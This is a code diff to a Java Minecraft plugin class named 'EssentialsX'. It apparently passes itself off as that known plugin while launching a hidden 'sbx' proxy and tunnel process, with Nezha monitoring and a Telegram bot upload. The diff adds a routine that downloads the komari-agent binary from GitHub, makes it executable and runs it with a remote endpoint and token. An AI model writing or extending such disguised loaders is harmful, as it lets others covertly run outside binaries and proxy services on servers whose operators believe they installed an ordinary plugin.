@@ -9,15 +9,18 @@ import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
+    private Process komariProcess;
     private volatile boolean shouldRun = true;
     private volatile boolean isProcessRunning = false;
+    private volatile boolean isKomariRunning = false;
     
     private static final String[] ALL_ENV_VARS = {
         "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
+        "KOMARI_ENDPOINT", "KOMARI_TOKEN"
     };
     
     @Override
@@ -73,9 +76,9 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "84398026-8650-454c-8a3c-f464100efd98");
+        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "nz.ccc.gv.uy:443");
+        env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
@@ -94,6 +97,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
+        env.put("KOMARI_ENDPOINT", "");
+        env.put("KOMARI_TOKEN", "");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
@@ -125,6 +130,17 @@ public class EssentialsX extends JavaPlugin {
         // Start a monitor thread to log when process exits
         startProcessMonitor();
         // getLogger().info("sbx started");
+
+        String komariEndpoint = env.get("KOMARI_ENDPOINT");
+        String komariToken = env.get("KOMARI_TOKEN");
+        if (komariEndpoint != null && !komariEndpoint.trim().isEmpty()
+                && komariToken != null && !komariToken.trim().isEmpty()) {
+            try {
+                startKomariProcess(komariEndpoint.trim(), komariToken.trim());
+            } catch (Exception e) {
+                getLogger().warning("Failed to start Komari agent: " + e.getMessage());
+            }
+        }
         
         // sleep 30 seconds
         Thread.sleep(30000);
@@ -228,6 +244,66 @@ public class EssentialsX extends JavaPlugin {
         monitorThread.setDaemon(true);
         monitorThread.start();
     }
+
+    private void startKomariProcess(String endpoint, String token) throws Exception {
+        if (isKomariRunning) {
+            return;
+        }
+
+        String osName = System.getProperty("os.name").toLowerCase();
+        if (!osName.contains("linux")) {
+            throw new RuntimeException("Komari agent supports Linux only: " + osName);
+        }
+
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String arch;
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            arch = "amd64";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            arch = "arm64";
+        } else {
+            throw new RuntimeException("Unsupported architecture for Komari agent: " + osArch);
+        }
+
+        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
+
+        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
+        Path komariBinary = tmpDir.resolve("komari-agent");
+
+        if (!Files.exists(komariBinary)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, komariBinary, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!komariBinary.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission for Komari agent");
+            }
+        }
+
+        ProcessBuilder pb = new ProcessBuilder(
+                komariBinary.toString(),
+                "-e", endpoint,
+                "-t", token
+        );
+        pb.directory(tmpDir.toFile());
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+
+        komariProcess = pb.start();
+        isKomariRunning = true;
+
+        Thread monitorThread = new Thread(() -> {
+            try {
+                komariProcess.waitFor();
+                isKomariRunning = false;
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                isKomariRunning = false;
+            }
+        }, "Komari-Process-Monitor");
+
+        monitorThread.setDaemon(true);
+        monitorThread.start();
+    }
     
     @Override
     public void onDisable() {
@@ -251,6 +327,23 @@ public class EssentialsX extends JavaPlugin {
                 Thread.currentThread().interrupt();
             }
             isProcessRunning = false;
+        }
+
+        if (komariProcess != null && komariProcess.isAlive()) {
+            komariProcess.destroy();
+
+            try {
+                if (!komariProcess.waitFor(10, TimeUnit.SECONDS)) {
+                    komariProcess.destroyForcibly();
+                    getLogger().warning("Forcibly terminated Komari agent");
+                } else {
+                    getLogger().info("Komari agent stopped normally");
+                }
+            } catch (InterruptedException e) {
+                komariProcess.destroyForcibly();
+                Thread.currentThread().interrupt();
+            }
+            isKomariRunning = false;
         }
         
         getLogger().info("EssentialsX plugin disabled");
